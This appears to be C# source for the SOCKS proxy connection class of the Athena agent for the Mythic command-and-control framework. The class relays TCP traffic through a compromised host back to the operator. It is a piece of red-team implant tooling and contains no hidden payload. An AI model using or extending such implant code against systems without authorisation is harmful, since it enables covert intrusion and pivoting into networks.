using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Athena.Models.Mythic.Response;
using Athena.Utilities;

namespace Athena.Models.Athena.Socks
{
    public class AthenaSocksConnection : NetCoreServer.TcpClient
    {
        public int server_id { get; set; }
        private bool exited { get; set; }
        ConnectionOptions co { get; set; }

        public AthenaSocksConnection(ConnectionOptions co) : base(co.ip, co.port){
            this.server_id = co.server_id;
            this.co = co;
            this.exited = false;
            this.OptionReceiveBufferSize = 15728640;
            this.OptionSendBufferSize = 15728640;
        }

        public void DisconnectAndStop()
        {
            DisconnectAsync();
            while (IsConnected)
                Thread.Yield();
        }

        protected override void OnConnected()
        {
            SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
            {
                server_id = this.server_id,
                data = Misc.Base64Encode(new ConnectResponse
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    addrtype = co.addressType,
                    status = ConnectResponseStatus.Success,

                }.ToByte()).Result,
                exit = false
            };
            Globals.socksHandler.ReturnMessage(smOut);
        }

        protected override void OnDisconnected()
        {
            //Is there a last little bit of buffer that's getting ignored here and that's causing the SSL errors?
            //maybe this? https://github.com/chronoxor/NetCoreServer/issues/166;
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.receiveasync?view=net-7.0#system-net-sockets-socket-receiveasync(system-net-sockets-socketasynceventargs)
            //.NET 7 will support AsyncSocket stuff so I might be able to migrate to that.
            this.exited = true;
            SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
            {
                server_id = this.server_id,
                data ="",
                exit = true
            };
            Globals.socksHandler.ReturnMessage(smOut);
        }

        protected override void OnReceived(byte[] buffer, long offset, long size)
        {
            //Should OnReceived add to an agent buffer and then return the entire thing as a message?
            byte[] b = new byte[(int)size];
            
            using(MemoryStream stream = new MemoryStream(buffer)){
                stream.Read(b, (int)offset, (int)size);
            }
            
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = Misc.Base64Encode(b).Result,
                exit = exited
            };
            Globals.socksHandler.ReturnMessage(smOut);
        }

        protected override void OnError(SocketError error)
        {
            Console.WriteLine($"Chat TCP client caught an error with code {error}");
        }
    }
}
